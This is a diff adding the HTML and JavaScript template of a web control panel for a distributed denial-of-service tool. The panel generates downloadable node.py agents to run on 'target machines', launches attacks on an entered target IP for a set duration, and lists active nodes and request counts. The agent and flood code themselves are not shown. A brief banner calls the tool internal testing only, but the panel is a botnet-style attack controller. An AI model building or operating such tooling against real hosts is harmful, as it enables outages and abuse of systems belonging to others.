@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Attack Controller</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- Include Tailwind CSS via CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        darkMode: 'class',
+        theme: {
+          extend: {
+            colors: {
+              background: "#111827",  // dark background
+              foreground: "#F9FAFB",  // light text
+              card: "#1F2937",        // card background
+              primary: "#2563eb",     // primary accent (blue)
+              accent: "#10B981",      // secondary accent (green)
+              warning: "#FBBF24",     // yellow for warnings
+            },
+          },
+        },
+      }
+    </script>
+  </head>
+  <body class="dark bg-background text-foreground p-5 font-sans">
+    <!-- Disclaimer -->
+    <div class="text-center py-3 px-4 bg-warning text-background mb-5 rounded font-bold">
+      ⚠️ WARNING: This tool is strictly for internal application testing purposes only.
+      Any other use is prohibited and may be illegal.
+    </div>
+    <h1 class="text-3xl font-bold text-center mb-8">
+      DDoS Test Controller
+    </h1>
+    
+    <!-- Responsive grid layout -->
+    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 max-w-6xl mx-auto">
+      <!-- Generate Node Card -->
+      <div class="bg-card rounded-lg p-6 shadow border border-gray-700">
+        <h2 class="text-xl font-medium border-b border-gray-700 pb-2 mb-4">
+          Generate Node
+        </h2>
+        <form onsubmit="generateNode(event)" class="flex flex-col space-y-4">
+          <input
+            type="text"
+            id="server_addr"
+            placeholder="Server Address (e.g., 192.168.1.100:5000)"
+            required
+            class="p-3 border border-gray-600 rounded bg-gray-800 text-foreground focus:outline-none focus:ring-2 focus:ring-primary"
+          />
+          <button
+            type="submit"
+            class="py-3 px-5 bg-accent text-background rounded font-bold transition duration-300 hover:bg-green-500"
+          >
+            Download Node
+          </button>
+        </form>
+        <p class="mt-3 text-sm text-gray-400">
+          Run the downloaded node.py on target machines
+        </p>
+      </div>
+      
+      <!-- Launch Test Card -->
+      <div class="bg-card rounded-lg p-6 shadow border border-gray-700">
+        <h2 class="text-xl font-medium border-b border-gray-700 pb-2 mb-4">
+          Launch Test
+        </h2>
+        <form onsubmit="startTest(event)" class="flex flex-col space-y-4">
+          <input
+            type="text"
+            id="target_ip"
+            placeholder="Target IP"
+            required
+            class="p-3 border border-gray-600 rounded bg-gray-800 text-foreground focus:outline-none focus:ring-2 focus:ring-primary"
+          />
+          <input
+            type="number"
+            id="duration"
+            placeholder="Duration (seconds)"
+            required
+            class="p-3 border border-gray-600 rounded bg-gray-800 text-foreground focus:outline-none focus:ring-2 focus:ring-primary"
+          />
+          <button
+            type="submit"
+            class="py-3 px-5 bg-primary text-background rounded font-bold transition duration-300 hover:bg-blue-600"
+          >
+            Start Attack
+          </button>
+        </form>
+      </div>
+      
+      <!-- Active Nodes Card -->
+      <div class="bg-card rounded-lg p-6 shadow border border-gray-700">
+        <h2 class="text-xl font-medium border-b border-gray-700 pb-2 mb-4">
+          Active Nodes: {{ nodes|length }}
+        </h2>
+        <ul class="list-none m-0 p-0">
+          {% for node_id, info in nodes.items() %}
+          <li class="py-2 border-b border-gray-700 last:border-0 text-gray-300">
+            {{ node_id }} ({{ info.ip }})
+          </li>
+          {% endfor %}
+        </ul>
+      </div>
+      
+      <!-- Test Status Card -->
+      <div class="bg-card rounded-lg p-6 shadow border border-gray-700">
+        <h2 class="text-xl font-medium border-b border-gray-700 pb-2 mb-4">
+          Test Status
+        </h2>
+        <div class="leading-relaxed">
+          {% if test %}
+          <p>
+            <span class="font-bold text-gray-300">Target:</span>
+            {{ test.target_ip }}
+          </p>
+          <p>
+            <span class="font-bold text-gray-300">Requests:</span>
+            {{ test.total_requests }}
+          </p>
+          <p>
+            <span class="font-bold text-gray-300">Status:</span>
+            {{ test.status }}
+          </p>
+          {% else %}
+          <p class="text-gray-400">No active test</p>
+          {% endif %}
+        </div>
+      </div>
+    </div>
+    
+    <script>
+      async function startTest(e) {
+        e.preventDefault();
+        const form = e.target;
+        const payload = {
+          target_ip: document.getElementById('target_ip').value,
+          duration: parseInt(document.getElementById('duration').value)
+        };
+
+        try {
+          const response = await fetch('/test', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+
+          if (!response.ok) {
+            throw new Error('Test failed to start');
+          }
+
+          // Clear the form
+          form.reset();
+
+          // Check test status before reloading
+          const result = await response.json();
+          if (result.status === "Attack started") {
+            location.reload();
+          } else {
+            alert('Test completed with no results');
+            location.reload();
+          }
+        } catch (error) {
+          alert('Failed to start test: ' + error.message);
+          form.reset();
+        }
+      }
+
+      function generateNode(e) {
+        e.preventDefault();
+        const serverAddr = document.getElementById('server_addr').value;
+        if (!serverAddr) {
+          alert('Please enter server address');
+          return;
+        }
+
+        // Validate format
+        if (!/^[\w\.-]+(:\d+)?$/.test(serverAddr)) {
+          alert('Invalid format. Use IP:PORT or domain');
+          return;
+        }
+
+        // Trigger download
+        window.location.href = `/generate?server_addr=${encodeURIComponent(serverAddr)}`;
+      }
+    </script>
+  </body>
+</html>
